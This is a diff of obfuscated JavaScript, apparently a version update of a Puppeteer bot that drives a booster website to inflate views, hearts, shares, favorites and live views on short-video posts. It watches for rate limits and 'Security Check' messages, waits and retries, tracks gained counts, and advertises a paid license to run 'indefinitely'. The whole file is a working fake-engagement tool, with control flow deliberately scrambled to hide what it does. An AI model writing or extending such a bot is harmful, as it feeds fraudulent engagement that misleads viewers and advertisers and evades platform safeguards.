-          v562.iCErp(f70, p1673, p1674, p1675, true);
+          v579.mEKrQ(f54, p);
           continue;
         case "6":
-          p1675 = await v562.EHPio(f64, p1675);
+          await p1734.goto(v92, {
+            timeout: 0
+          });
           continue;
       }
       break;
     }
   }
 }
-async function f71(p1697, p1698, p1699, p1700) {
-  const v569 = {
-    HuFca: "Service disabled now",
-    JUMZX: "You are being rate limited",
-    nliUB: function (p1701, p1702) {
-      return p1701(p1702);
+async function f72(p1773, p1774, p1775, p1776) {
+  const v586 = {
+    fHRaD: "Service disabled now",
+    XjbaA: "You are being rate limited",
+    lVujK: "...",
+    nBtxp: function (p1777, p1778) {
+      return p1777(p1778);
     },
-    PKXGF: function (p1703, p1704) {
-      return p1703(p1704);
+    oQICx: function (p1779, p1780) {
+      return p1779(p1780);
     },
-    zMeDr: function (p1705, p1706) {
-      return p1705(p1706);
+    nCXrh: function (p1781, p1782) {
+      return p1781 > p1782;
     },
-    OPAjb: function (p1707, p1708) {
-      return p1707 > p1708;
+    ynhoc: function (p1783) {
+      return p1783();
     },
-    TnYEO: function (p1709) {
-      return p1709();
+    JNLAi: function (p1784) {
+      return p1784();
     },
-    XCaoj: function (p1710, p1711) {
-      return p1710 / p1711;
+    nWpRm: function (p1785, p1786) {
+      return p1785 / p1786;
     },
-    Mszsa: function (p1712, p1713) {
-      return p1712(p1713);
+    TChyu: function (p1787) {
+      return p1787();
     },
-    eXOny: function (p1714, p1715) {
-      return p1714(p1715);
+    uzZUH: function (p1788, p1789) {
+      return p1788(p1789);
     },
-    oyicG: function (p1716, p1717) {
-      return p1716 * p1717;
+    tvXCR: function (p1790, p1791) {
+      return p1790(p1791);
     },
-    wwKZy: function (p1718, p1719) {
-      return p1718 * p1719;
+    tPXHT: function (p1792, p1793) {
+      return p1792 * p1793;
     },
-    EfyPo: function (p1720) {
-      return p1720();
+    FJPUB: function (p1794, p1795) {
+      return p1794 / p1795;
     },
-    TnOlf: function (p1721, p1722, p1723, p1724, p1725) {
-      return p1721(p1722, p1723, p1724, p1725);
+    XrMSj: function (p1796, p1797, p1798, p1799, p1800) {
+      return p1796(p1797, p1798, p1799, p1800);
     },
-    zoZvU: function (p1726, p1727, p1728) {
-      return p1726(p1727, p1728);
+    PLjvW: function (p1801, p1802, p1803) {
+      return p1801(p1802, p1803);
     }
   };
-  return v569.zoZvU(setInterval, async () => {
-    let v570 = await p1697.evaluate("(() => {\n        const element = document.querySelector(\"#msg\");\n        return element ? element.innerText : \"\";\n      })();");
-    v570 = v570.replace(/(\r\n|\n|\r)/gm, " ");
-    let v571 = await p1697.evaluate("(() => {\n        var bt = document.querySelector('" + p1698 + "');\n        if (bt && bt.disabled) {\n          return true;\n        }\n        return false;\n      })();");
-    if (v571) {
-      v570 = v569.HuFca;
+  return v586.PLjvW(setInterval, async () => {
+    let v587 = await p1773.evaluate("(() => {\n        const element = document.querySelector(\"#msg\");\n        return element ? element.innerText : \"\";\n      })();");
+    v587 = v587.replace(/(\r\n|\n|\r)/gm, " ");
+    let v588 = await p1773.evaluate("(() => {\n        var bt = document.querySelector('" + p1774 + "');\n        if (bt && bt.disabled) {\n          return true;\n        }\n        return false;\n      })();");
+    if (v588) {
+      v587 = v586.fHRaD;
     }
-    const v572 = await p1697.content();
-    if (/You are being rate limited/.test(v572)) {
-      v570 = v569.JUMZX;
+    const v589 = await p1773.content();
+    if (/You are being rate limited/.test(v589)) {
+      v587 = v586.XjbaA;
     }
-    if (/wrong/.test(v570) || /try again/.test(v570) || /Security Check/.test(v570) || /0 Comments/.test(v570) || /Service disabled now/.test(v570) || /You are being rate limited/.test(v570)) {
-      v569.nliUB(clearInterval, v70);
-      v569.PKXGF(clearInterval, v71);
-      v569.PKXGF(clearInterval, v72);
-      let v573 = await v569.zMeDr(f49, v82);
-      let v574 = "";
-      if (v569.OPAjb(v74, 0)) {
-        v574 = "[32m+" + v74 + "[0m";
+    if (/@/.test(v587)) {
+      v587 = v586.lVujK;
+    }
+    if (/wrong/.test(v587) || /try again/.test(v587) || /Security Check/.test(v587) || / 0 Comments/.test(v587) || /Service disabled now/.test(v587) || /You are being rate limited/.test(v587)) {
+      v586.nBtxp(clearInterval, v68);
+      v586.nBtxp(clearInterval, v69);
+      v586.nBtxp(clearInterval, v70);
+      let v590 = await v586.oQICx(f50, v80);
+      let v591 = "";
+      if (v586.nCXrh(v72, 0)) {
+        v591 = "[32m+" + v72 + "[0m";
       } else {
-        v574 = "";
+        v591 = "";
       }
-      if (/wrong/.test(v570) || /try again/.test(v570) || /0 Comments/.test(v570) || /Service disabled now/.test(v570) || /You are being rate limited/.test(v570)) {
-        await v569.TnYEO(f30);
-        if (!v26) {
+      if (/wrong/.test(v587) || /try again/.test(v587) || / 0 Comments/.test(v587) || /Service disabled now/.test(v587) || /You are being rate limited/.test(v587)) {
+        await v586.ynhoc(f31);
+        if (!v28) {
           process.stdout.moveCursor(0, -3);
           process.stdout.clearScreenDown();
-          process.stdout.write("\n" + v54 + "[33m " + p1699 + " [34m[" + v573 + "][0m " + v574 + "  [90m(" + v569.TnYEO(f55) + " /hr " + v569.XCaoj(v569.TnYEO(f54), 60).toFixed(2) + " hrs)[0m\n\n");
-          process.stdout.write(v57 + " Waiting: " + v68 + " mins (ERROR: " + v570.substring(0, 22) + ")...");
+          process.stdout.write("\n" + v52 + "[33m " + p1775 + " [34m[" + v590 + "][0m " + v591 + "  [90m(" + v586.JNLAi(f56) + " /hr " + v586.nWpRm(v586.TChyu(f55), 60).toFixed(2) + " hrs)[0m\n\n");
+          process.stdout.write(v55 + " Waiting: " + v66 + " mins (ERROR: " + v587.substring(0, 22) + ")...");
         }
-        v569.Mszsa(f53, "Waiting " + v68 + " mins (ERROR: " + v570 + ")...");
-        await v569.eXOny(f52, v569.oyicG(v569.wwKZy(v68, 60), 1000));
+        v586.uzZUH(f54, "Waiting " + v66 + " mins (ERROR: " + v587 + ")...");
+        await v586.tvXCR(f53, v586.tPXHT(v586.tPXHT(v66, 60), 1000));
       }
-      if (!v26) {
+      if (!v28) {
         process.stdout.moveCursor(0, -3);
         process.stdout.clearScreenDown();
-        process.stdout.write("\n" + v54 + "[33m " + p1699 + " [34m[" + v573 + "][0m " + v574 + "  [90m(" + v569.TnYEO(f55) + " /hr " + v569.XCaoj(v569.EfyPo(f54), 60).toFixed(2) + " hrs)[0m\n\n");
-        process.stdout.write(v55 + " Running: Trying again (ERROR: " + v570.substring(0, 22) + ")...");
+        process.stdout.write("\n" + v52 + "[33m " + p1775 + " [34m[" + v590 + "][0m " + v591 + "  [90m(" + v586.ynhoc(f56) + " /hr " + v586.FJPUB(v586.JNLAi(f55), 60).toFixed(2) + " hrs)[0m\n\n");
+        process.stdout.write(v53 + " Running: Trying again (ERROR: " + v587.substring(0, 22) + ")...");
       }
-      v569.zMeDr(f53, "Trying again (ERROR: " + v570 + ")...");
-      p1697 = await v569.eXOny(f64, p1697);
-      await p1697.goto(v92, {
+      v586.nBtxp(f54, "Trying again (ERROR: " + v587 + ")...");
+      p1773 = await v586.oQICx(f65, p1773);
+      await p1773.goto(v92, {
         timeout: 0
       });
-      v569.TnOlf(f23, p1699, p1700, p1697, true);
+      v586.XrMSj(f24, p1775, p1776, p1773, true);
       return;
     }
   }, 20000);
 }
-async function f72(p1729, p1730, p1731, p1732, p1733 = null) {
-  const v576 = {
-    Yhfhz: "You are using the FREE version limited to ~5000\n",
-    RqYZT: "accumulations. The advantage of acquiring the\n",
-    terfz: "license is that the bot continues to work\n",
-    lzPBV: "indefinitely and accumulates large amounts.\n",
-    RBYLu: function (p1734, p1735) {
-      return p1734 !== p1735;
+async function f73(p1804, p1805, p1806, p1807, p1808 = null) {
+  const v593 = {
+    bMzgd: "You are using the FREE version limited to ~5000\n",
+    OhdKq: "accumulations. The advantage of acquiring the\n",
+    nfznn: "license is that the bot continues to work\n",
+    zEKjG: "indefinitely and accumulates large amounts.\n",
+    WlzIK: function (p1809, p1810) {
+      return p1809 !== p1810;
     },
-    fpLHR: "Up Comments Hearts",
-    rcTni: function (p1736, p1737) {
-      return p1736(p1737);
+    AnYMz: "Up Comments Hearts",
+    WPVgt: function (p1811, p1812) {
+      return p1811(p1812);
     },
-    rMbZz: "en-US",
-    MNAcN: function (p1738, p1739) {
-      return p1738 === p1739;
+    jplXG: "en-US",
+    jCyIY: function (p1813, p1814) {
+      return p1813 === p1814;
     },
-    LCJqi: function (p1740, p1741) {
-      return p1740 > p1741;
+    eXFzk: function (p1815, p1816) {
+      return p1815 > p1816;
     },
-    VAAgW: "1|0|4|3|9|2|7|5|8|6",
-    dSKdB: function (p1742, p1743) {
-      return p1742(p1743);
+    tRACb: "6|2|3|5|4|1|8|0|9|7",
+    zVVpl: function (p1817, p1818, p1819, p1820, p1821, p1822) {
+      return p1817(p1818, p1819, p1820, p1821, p1822);
     },
-    ogwod: function (p1744, p1745) {
-      return p1744(p1745);
+    OxdUy: function (p1823, p1824) {
+      return p1823(p1824);
     },
-    Vmdyu: function (p1746, p1747, p1748, p1749, p1750, p1751) {
-      return p1746(p1747, p1748, p1749, p1750, p1751);
+    XbcmM: function (p1825, p1826, p1827, p1828, p1829, p1830) {
+      return p1825(p1826, p1827, p1828, p1829, p1830);
     },
-    bIfRv: function (p1752, p1753, p1754, p1755, p1756) {
-      return p1752(p1753, p1754, p1755, p1756);
+    SfMrF: function (p1831, p1832, p1833, p1834, p1835) {
+      return p1831(p1832, p1833, p1834, p1835);
     },
-    vNruR: "You are being rate limited",
-    mNeaT: function (p1757, p1758) {
-      return p1757 !== p1758;
+    xbLhE: function (p1836, p1837) {
+      return p1836 > p1837;
     },
-    hEZZp: "0|2|4|1|3",
-    iToSL: function (p1759, p1760) {
-      return p1759 !== p1760;
+    QcFWL: "You are being rate limited",
+    rSane: "...",
+    zJeST: "2|4|3|0|1",
+    vjuQE: function (p1838, p1839) {
+      return p1838 !== p1839;
     },
-    ainMc: function (p1761, p1762) {
-      return p1761(p1762);
+    vwXNw: function (p1840, p1841) {
+      return p1840(p1841);
     },
-    BroNR: function (p1763, p1764) {
-      return p1763 === p1764;
+    IhJim: function (p1842, p1843) {
+      return p1842(p1843);
     },
-    HXZze: function (p1765, p1766) {
-      return p1765 - p1766;
+    kucdQ: function (p1844, p1845) {
+      return p1844 - p1845;
     },
-    RwYRE: function (p1767, p1768) {
-      return p1767 || p1768;
+    wjCXk: function (p1846, p1847) {
+      return p1846 || p1847;
     },
-    ODbmc: function (p1769, p1770) {
-      return p1769 !== p1770;
+    QLOIt: function (p1848, p1849) {
+      return p1848 !== p1849;
     },
-    yiLzr: function (p1771, p1772) {
-      return p1771 !== p1772;
+    PjiKA: "Up Live Views",
+    IIVIY: "Up Hearts",
+    LqBcq: function (p1850, p1851) {
+      return p1850(p1851);
     },
-    NeYAr: "Up Live Views",
-    FZMWF: "Up Hearts",
-    PzfdY: function (p1773, p1774) {
-      return p1773(p1774);
+    kJoiJ: function (p1852, p1853) {
+      return p1852 >= p1853;
     },
-    USTMU: function (p1775, p1776) {
-      return p1775 >= p1776;
+    kMvmx: "Up Views",
+    cBLXk: function (p1854, p1855) {
+      return p1854(p1855);
     },
-    sgwbe: "Up Views",
-    zVMOA: function (p1777, p1778) {
-      return p1777(p1778);
+    EJbZS: function (p1856, p1857) {
+      return p1856 >= p1857;
     },
-    Tspwk: "Up Shares",
-    QIqWd: function (p1779, p1780) {
-      return p1779(p1780);
+    XPoGO: function (p1858, p1859) {
+      return p1858(p1859);
     },
-    gCjjx: function (p1781, p1782) {
-      return p1781 >= p1782;
+    yKduZ: "Up Shares",
+    MWPgt: function (p1860, p1861) {
+      return p1860(p1861);
     },
-    iUWid: function (p1783, p1784) {
-      return p1783 === p1784;
+    QUvjU: function (p1862, p1863) {
+      return p1862 === p1863;
     },
-    BmsmF: "Up Favorites",
-    REehf: function (p1785, p1786) {
-      return p1785(p1786);
+    hDtTW: "Up Favorites",
+    wKpYU: function (p1864, p1865) {
+      return p1864 === p1865;
     },
-    epLrE: function (p1787, p1788) {
-      return p1787 === p1788;
+    sucwp: function (p1866, p1867) {
+      return p1866 === p1867;
     },
-    XTeNy: function (p1789, p1790) {
-      return p1789 === p1790;
+    mpQFr: function (p1868, p1869) {
+      return p1868 - p1869;
     },
-    AsJRZ: function (p1791, p1792) {
-      return p1791 - p1792;
+    daWfN: function (p1870, p1871) {
+      return p1870 !== p1871;
     },
-    HbKtw: function (p1793, p1794) {
-      return p1793 > p1794;
+    ZLyTi: function (p1872, p1873) {
+      return p1872(p1873);
     },
-    FMxXd: function (p1795, p1796) {
-      return p1795 === p1796;
+    huQma: function (p1874, p1875) {
+      return p1874(p1875);
     },
-    ISBdl: function (p1797, p1798) {
-      return p1797 - p1798;
+    RbjVz: function (p1876, p1877) {
+      return p1876 - p1877;
     },
-    tekst: function (p1799, p1800) {
-      return p1799 - p1800;
+    lpBqW: function (p1878, p1879) {
+      return p1878 === p1879;
     },
-    zrste: function (p1801, p1802) {
-      return p1801 !== p1802;
+    gmhLq: function (p1880, p1881) {
+      return p1880 - p1881;
     },
-    FDUrt: function (p1803, p1804) {
-      return p1803(p1804);
+    UCEut: function (p1882) {
+      return p1882();
     },
-    wDUTM: function (p1805) {
-      return p1805();
+    pLdqB: function (p1883, p1884) {
+      return p1883 / p1884;
     },
-    LOWSt: function (p1806, p1807) {
-      return p1806 / p1807;
+    vFJof: function (p1885, p1886) {
+      return p1885 || p1886;
     },
-    sYvDj: function (p1808) {
-      return p1808();
+    FcWcH: function (p1887, p1888) {
+      return p1887(p1888);
     },
-    WEQbA: function (p1809, p1810) {
-      return p1809 > p1810;
+    KUkjQ: function (p1889, p1890) {
+      return p1889 > p1890;
     },
-    PObwK: "4|3|0|5|1|2",
-    TBbHA: function (p1811) {
-      return p1811();
+    VYaIH: "4|2|0|1|5|3",
+    tcUcl: function (p1891, p1892) {
+      return p1891(p1892);
     },
-    bkgZj: function (p1812, p1813, p1814) {
-      return p1812(p1813, p1814);
+    NAgZY: function (p1893, p1894) {
+      return p1893(p1894);
     },
-    pikDK: function (p1815, p1816) {
-      return p1815(p1816);
+    WIGpk: function (p1895, p1896, p1897) {
+      return p1895(p1896, p1897);
     },
-    MJHYp: function (p1817, p1818) {
-      return p1817 > p1818;
+    DYtKw: function (p1898) {
+      return p1898();
     },
-    fCdkx: function (p1819, p1820) {
-      return p1819 > p1820;
+    YWWBU: function (p1899, p1900) {
+      return p1899(p1900);
     },
-    XRCfy: "min-limit",
-    nmgYC: function (p1821, p1822) {
-      return p1821 < p1822;
+    kJZCG: function (p1901) {
+      return p1901();
     },
-    QFzjJ: function (p1823) {
-      return p1823();
+    YpsIf: "min-limit",
+    fUvdf: function (p1902, p1903) {
+      return p1902 > p1903;
     },
-    ReKMo: function (p1824) {
-      return p1824();
+    oFLFc: function (p1904, p1905) {
+      return p1904 < p1905;
     },
-    KLUbq: "max-time",
-    MjxoS: function (p1825, p1826) {
-      return p1825 * p1826;
+    VFhfY: function (p1906, p1907) {
+      return p1906 > p1907;
     },
-    kuIpy: function (p1827, p1828, p1829) {
-      return p1827(p1828, p1829);
+    UJrgU: function (p1908) {
+      return p1908();
+    },
+    DwmUs: "max-time",
+    UVMfb: function (p1909, p1910) {
+      return p1909 > p1910;
+    },
+    WaZDk: function (p1911) {
+      return p1911();
+    },
+    ebJPO: function (p1912, p1913) {
+      return p1912 * p1913;
+    },
+    ubJwA: function (p1914, p1915) {
+      return p1914(p1915);
+    },
+    cbWBf: function (p1916) {
+      return p1916();
+    },
+    XApIx: function (p1917, p1918) {
+      return p1917(p1918);
     }
   };
-  let v577 = 0;
-  let v578;
-  let v579 = "";
-  let v580 = false;
-  let v581 = true;
-  let v582 = 0;
-  let v583 = await v576.FDUrt(f49, v82);
-  return v576.kuIpy(setInterval, async () => {
-    const v584 = {
-      zuPCl: v576.Yhfhz,
-      vVDrf: v576.RqYZT,
-      zstNG: v576.terfz,
-      aMiZZ: v576.lzPBV
-    };
-    const vV584 = v584;
-    let v585 = "";
+  let v594 = 0;
+  let v595;
+  let v596 = "";
+  let v597 = false;
+  let v598 = true;
+  let v599 = 0;
+  let v600 = await v593.XApIx(f50, v80);
+  return v593.WIGpk(setInterval, async () => {
+    let v601 = "";
     try {
-      v585 = await p1729.evaluate("(() => {\n          var infoElement = document.querySelector('.modal.show');\n          if (infoElement) {\n            return infoElement.innerText;\n          }\n          return \"\";\n        })();");
-    } catch (H) {}
-    let v586 = "";
-    if (v576.RBYLu(p1731, v576.fpLHR)) {
-      v586 = await p1729.evaluate("(() => {\n          var pointsElement = document.querySelector('" + p1730 + "');\n          if (pointsElement) {\n            return pointsElement.getAttribute('title');\n          }\n          return \"\";\n        })();");
+      v601 = await p1804.evaluate("(() => {\n          var infoElement = document.querySelector('.modal.show');\n          if (infoElement) {\n            return infoElement.innerText;\n          }\n          return \"\";\n        })();");
+    } catch (y) {}
+    let v602 = "";
+    if (v593.WlzIK(p1806, v593.AnYMz)) {
+      v602 = await p1804.evaluate("(() => {\n          var pointsElement = document.querySelector('" + p1805 + "');\n          if (pointsElement) {\n            return pointsElement.getAttribute('title');\n          }\n          return \"\";\n        })();");
     }
-    v586 = v586 ? v576.rcTni(parseInt, v586).toLocaleString(v576.rMbZz) : "";
-    let v587 = await p1729.evaluate("(() => {\n        var minElement = document.getElementById('min');\n        var secElement = document.getElementById('sec');\n        if (minElement && secElement) {\n          var minutes = minElement.textContent;\n          var seconds = secElement.textContent;\n          return \" Please wait \" + minutes + \" minute(s) \" + seconds + \" seconds\";\n        }\n        return \"\";\n      })();");
-    let v588 = await p1729.evaluate("(() => {\n        const element = document.querySelector(\"#msg > h3\");\n        return element ? element.innerText : \"\";\n      })();");
-    let v589 = v585 ? v585 : v587 ? v587 : v586 ? v586 : v588;
-    if (v576.MNAcN(p1731, v576.fpLHR) && !v587 && !v585 && v87 && v88) {
-      v589 = v88.concat;
+    v602 = v602 ? v593.WPVgt(parseInt, v602).toLocaleString(v593.jplXG) : "";
+    let v603 = await p1804.evaluate("(() => {\n        var minElement = document.getElementById('min');\n        var secElement = document.getElementById('sec');\n        if (minElement && secElement) {\n          var minutes = minElement.textContent;\n          var seconds = secElement.textContent;\n          return \" Please wait \" + minutes + \" minute(s) \" + seconds + \" seconds\";\n        }\n        return \"\";\n      })();");
+    let v604 = await p1804.evaluate("(() => {\n        const element = document.querySelector(\"#msg > h3\");\n        return element ? element.innerText : \"\";\n      })();");
+    let v605 = v601 ? v601 : v603 ? v603 : v602 ? v602 : v604;
+    if (v593.jCyIY(p1806, v593.AnYMz) && !v603 && !v601 && v85 && v86) {
+      v605 = v86.concat;
     }
-    if (v576.LCJqi(v86.length, 0) && v87 && v576.MNAcN(p1733, null)) {
-      const v590 = v576.VAAgW.split("|");
-      let v591 = 0;
+    if (v593.eXFzk(v84.length, 0) && v85 && v593.jCyIY(p1808, null)) {
+      const v606 = v593.tRACb.split("|");
+      let v607 = 0;
       while (true) {
-        switch (v590[v591++]) {
+        switch (v606[v607++]) {
           case "0":
-            v576.rcTni(clearInterval, v70);
+            v69 = await v593.zVVpl(f74, p1804, p1805, p1806, p1807, p1808);
             continue;
           case "1":
-            if (!v26) {
+            v86 = v84[p1808];
+            continue;
+          case "2":
+            v593.OxdUy(clearInterval, v68);
+            continue;
+          case "3":
+            v593.WPVgt(clearInterval, v69);
+            continue;
+          case "4":
+            p1808 = await v593.OxdUy(f22, v84);
+            continue;
+          case "5":
+            v593.WPVgt(clearInterval, v70);
+            continue;
+          case "6":
+            if (!v28) {
               process.stdout.moveCursor(0, -3);
               process.stdout.cursorTo(0);
               process.stdout.clearScreenDown();
             }
             continue;
-          case "2":
-            v88 = v86[p1733];
-            continue;
-          case "3":
-            v576.dSKdB(clearInterval, v72);
-            continue;
-          case "4":
-            v576.ogwod(clearInterval, v71);
-            continue;
-          case "5":
-            v71 = await v576.Vmdyu(f73, p1729, p1730, p1731, p1732, p1733);
-            continue;
-          case "6":
+          case "7":
             console.log("\n\n");
             continue;
-          case "7":
-            v70 = await v576.Vmdyu(f72, p1729, p1730, p1731, p1732, p1733);
-            continue;
           case "8":
-            v72 = await v576.bIfRv(f71, p1729, p1730, p1731, p1732);
+            v68 = await v593.XbcmM(f73, p1804, p1805, p1806, p1807, p1808);
             continue;
           case "9":
-            p1733 = await v576.dSKdB(f22, v86);
+            v70 = await v593.SfMrF(f72, p1804, p1805, p1806, p1807);
             continue;
         }
         break;
       }
     }
-    if (v576.LCJqi(v86.length, 0) && !v87) {
-      v589 = "Extracting comments (" + v86.length + ")...";
+    if (v593.xbLhE(v84.length, 0) && !v85) {
+      v605 = "Extracting comments (" + v84.length + ")...";
     }
-    v589 = v589.replace(/(\r\n|\n|\r)/gm, " ");
-    const v592 = await p1729.content();
-    if (/You are being rate limited/.test(v592)) {
-      v589 = v576.vNruR;
+    v605 = v605.replace(/(\r\n|\n|\r)/gm, " ");
+    const v608 = await p1804.content();
+    if (/You are being rate limited/.test(v608)) {
+      v605 = v593.QcFWL;
     }
-    let vV552 = v55;
-    vV552 = /error/.test(v589) ? v56 : vV552;
-    vV552 = /wrong/.test(v589) ? v56 : vV552;
-    vV552 = /try again/.test(v589) ? v56 : vV552;
-    vV552 = /0 Comments/.test(v589) ? v56 : vV552;
-    vV552 = /Service disabled now/.test(v589) ? v56 : vV552;
-    vV552 = /You are being rate limited/.test(v589) ? v56 : vV552;
-    vV552 = /wait/.test(v589) ? v580 ? v57 : v58 : vV552;
-    if (v576.mNeaT(p1733, null) && v86.length) {
-      const v593 = v576.hEZZp.split("|");
-      let v594 = 0;
+    if (/@/.test(v605)) {
+      v605 = v593.rSane;
+    }
+    let vV532 = v53;
+    vV532 = /error/.test(v605) ? v54 : vV532;
+    vV532 = /wrong/.test(v605) ? v54 : vV532;
+    vV532 = /try again/.test(v605) ? v54 : vV532;
+    vV532 = / 0 Comments/.test(v605) ? v54 : vV532;
+    vV532 = /Service disabled now/.test(v605) ? v54 : vV532;
+    vV532 = /You are being rate limited/.test(v605) ? v54 : vV532;
+    vV532 = /wait/.test(v605) ? v597 ? v55 : v56 : vV532;
+    if (v593.WlzIK(p1808, null) && v84.length) {
+      const v609 = v593.zJeST.split("|");
+      let v610 = 0;
       while (true) {
-        switch (v593[v594++]) {
+        switch (v609[v610++]) {
           case "0":
-            v577 = v88.likes;
-            continue;
-          case "1":
-            if (v576.iToSL(v74, v582)) {
-              v576.rcTni(f53, "[" + p1731 + "] " + v577 + " (+" + v74 + ") " + p1732);
-              v576.ainMc(f83, p1731);
+            if (v593.vjuQE(v72, v599)) {
+              v593.vwXNw(f54, "[" + p1806 + "] " + v594 + " (+" + v72 + ") " + p1807);
+              v593.IhJim(f84, p1806);
             }
             continue;
+          case "1":
+            v599 = v72;
+            continue;
           case "2":
-            if (v576.MNAcN(v73, 0)) {
-              if (v576.BroNR(v75, 0)) {
-                v73 = v577;
+            v594 = v86.likes;
+            continue;
+          case "3":
+            v72 = Math.abs(v593.kucdQ(v594, v71));
+            continue;
+          case "4":
+            if (v593.jCyIY(v71, 0)) {
+              if (v593.jCyIY(v73, 0)) {
+                v71 = v594;
               } else {
-                v73 = v576.HXZze(v577, v75);
+                v71 = v593.kucdQ(v594, v73);
               }
             }
             continue;
-          case "3":
-            v582 = v74;
-            continue;
-          case "4":
-            v74 = Math.abs(v576.HXZze(v577, v73));
-            continue;
         }
         break;
       }
     } else {
-      const v595 = v589.replace(" ", "").match(/\d+(,\d+)*(?![^,])/g);
-      if (v576.RwYRE(v581, v595) && v576.ODbmc(p1731, v576.fpLHR) && v576.yiLzr(p1731, v576.NeYAr)) {
-        v589 = "";
-        v578 = v577;
-        if (v576.MNAcN(p1731, v576.FZMWF)) {
-          let v596 = await v576.PzfdY(f57, p1732);
-          v577 = v596?.diggCount || v578;
-          if (v576.USTMU(v577, 10000) || !v596) {
-            v577 = (await v576.PzfdY(f59, p1732))?.diggCount || v578;
+      const v611 = v605.replace(" ", "").match(/\d+(,\d+)*(?![^,])/g);
+      if (v593.wjCXk(v598, v611) && v593.WlzIK(p1806, v593.AnYMz) && v593.QLOIt(p1806, v593.PjiKA)) {
+        v605 = "";
+        v595 = v594;
+        if (v593.jCyIY(p1806, v593.IIVIY)) {
+          let v612 = await v593.LqBcq(f58, p1807);
+          v594 = v612?.diggCount || v595;
+          if (v593.kJoiJ(v594, 10000) || !v612) {
+            v594 = (await v593.WPVgt(f60, p1807))?.diggCount || v595;
           }
         }
-        if (v576.BroNR(p1731, v576.sgwbe)) {
-          let v597 = await v576.zVMOA(f57, p1732);
-          v577 = v597?.playCount || v578;
-          if (v576.USTMU(v577, 10000) || !v597) {
-            v577 = (await v576.ainMc(f59, p1732))?.playCount || v578;
+        if (v593.jCyIY(p1806, v593.kMvmx)) {
+          let v613 = await v593.cBLXk(f58, p1807);
+          v594 = v613?.playCount || v595;
+          if (v593.EJbZS(v594, 10000) || !v613) {
+            v594 = (await v593.XPoGO(f60, p1807))?.playCount || v595;
           }
         }
-        if (v576.BroNR(p1731, v576.Tspwk)) {
-          let v598 = await v576.QIqWd(f57, p1732);
-          v577 = v598?.shareCount || v578;
-          if (v576.gCjjx(v577, 10000) || !v598) {
-            v577 = (await v576.rcTni(f59, p1732))?.shareCount || v578;
+        if (v593.jCyIY(p1806, v593.yKduZ)) {
+          let v614 = await v593.MWPgt(f58, p1807);
+          v594 = v614?.shareCount || v595;
+          if (v593.kJoiJ(v594, 10000) || !v614) {
+            v594 = (await v593.IhJim(f60, p1807))?.shareCount || v595;
           }
         }
-        if (v576.iUWid(p1731, v576.BmsmF)) {
-          let v599 = await v576.REehf(f57, p1732);
-          v577 = v599?.collectCount || v578;
-          if (!v599) {
-            v577 = v595 ? v576.ogwod(parseInt, v595[0].replace(/[,\.]/g, "")) : v578;
+        if (v593.QUvjU(p1806, v593.hDtTW)) {
+          let v615 = await v593.WPVgt(f58, p1807);
+          v594 = v615?.collectCount || v595;
+          if (!v615) {
+            v594 = v611 ? v593.IhJim(parseInt, v611[0].replace(/[,\.]/g, "")) : v595;
           }
         }
-        if (v576.epLrE(v73, 0)) {
-          if (v576.XTeNy(v75, 0)) {
-            v73 = v577;
+        if (v593.wKpYU(v71, 0)) {
+          if (v593.sucwp(v73, 0)) {
+            v71 = v594;
           } else {
-            v73 = v576.AsJRZ(v577, v75);
+            v71 = v593.kucdQ(v594, v73);
           }
         }
-        v74 = Math.abs(v576.AsJRZ(v577, v73));
-        if (v576.yiLzr(v74, v582)) {
-          v576.PzfdY(f53, "[" + p1731 + "] " + v577 + " (+" + v74 + ") " + p1732);
-          v576.rcTni(f83, p1731);
+        v72 = Math.abs(v593.mpQFr(v594, v71));
+        if (v593.daWfN(v72, v599)) {
+          v593.ZLyTi(f54, "[" + p1806 + "] " + v594 + " (+" + v72 + ") " + p1807);
+          v593.huQma(f84, p1806);
         }
-        v582 = v74;
-        v581 = false;
-        v589 = v577.toLocaleString(v576.rMbZz);
+        v599 = v72;
+        v598 = false;
+        v605 = v594.toLocaleString(v593.jplXG);
       }
     }
-    if (v576.LCJqi(v74, 0)) {
-      v579 = "[32m+" + v74 + "[0m";
+    if (v593.xbLhE(v72, 0)) {
+      v596 = "[32m+" + v72 + "[0m";
     } else {
-      v579 = "";
+      v596 = "";
     }
-    if (v576.XTeNy(p1731, v576.NeYAr)) {
-      if (v576.HbKtw(v83, v85)) {
-        const v600 = v576.AsJRZ(v83, v85);
-        v84 += v600;
+    if (v593.wKpYU(p1806, v593.PjiKA)) {
+      if (v593.xbLhE(v81, v83)) {
+        const v616 = v593.RbjVz(v81, v83);
+        v82 += v616;
       }
-      v85 = v83;
-      v577 = v84;
-      if (v576.FMxXd(v73, 0)) {
-        if (v576.MNAcN(v75, 0)) {
-          v73 = v577;
+      v83 = v81;
+      v594 = v82;
+      if (v593.QUvjU(v71, 0)) {
+        if (v593.lpBqW(v73, 0)) {
+          v71 = v594;
         } else {
-          v73 = v576.ISBdl(v577, v75);
+          v71 = v593.gmhLq(v594, v73);
         }
       }
-      v74 = Math.abs(v576.tekst(v577, v73));
-      if (v576.zrste(v74, v582)) {
-        v576.QIqWd(f53, "[" + p1731 + "] " + v577 + " (+" + v74 + ") " + p1732);
-        v576.FDUrt(f83, p1731);
+      v72 = Math.abs(v593.mpQFr(v594, v71));
+      if (v593.daWfN(v72, v599)) {
+        v593.IhJim(f54, "[" + p1806 + "] " + v594 + " (+" + v72 + ") " + p1807);
+        v593.LqBcq(f84, p1806);
       }
-      v582 = v74;
-      v579 = "[32m● " + v83 + " +" + v74 + "[0m";
+      v599 = v72;
+      v596 = "[32m● " + v81 + " +" + v72 + "[0m";
     }
-    if (!v26) {
+    if (!v28) {
       process.stdout.moveCursor(0, -3);
       process.stdout.clearScreenDown();
-      process.stdout.write("\n" + v54 + "[33m " + p1731 + " [34m[" + v583 + "][0m " + v579 + "  [90m(" + v576.wDUTM(f55) + " /hr " + v576.LOWSt(v576.sYvDj(f54), 60).toFixed(2) + " hrs)[0m\n\n");
-      process.stdout.write(vV552 + " Running: " + v589.substring(0, 43));
+      process.stdout.write("\n" + v52 + "[33m " + p1806 + " [34m[" + v600 + "][0m " + v596 + "  [90m(" + v593.UCEut(f56) + " /hr " + v593.pLdqB(v593.UCEut(f55), 60).toFixed(2) + " hrs)[0m\n\n");
+      process.stdout.write(vV532 + " Running: " + v605.substring(0, 43));
     }
-    if (v576.RwYRE(v24, v26) && v27) {
-      v576.PzfdY(f53, "[" + p1731 + "] " + v577 + " (+" + v74 + ") [" + p1732 + "] Running: " + v589);
+    if (v593.vFJof(v26, v28) && v29) {
+      v593.FcWcH(f54, "[" + p1806 + "] " + v594 + " (+" + v72 + ") [" + p1807 + "] Running: " + v605);
     }
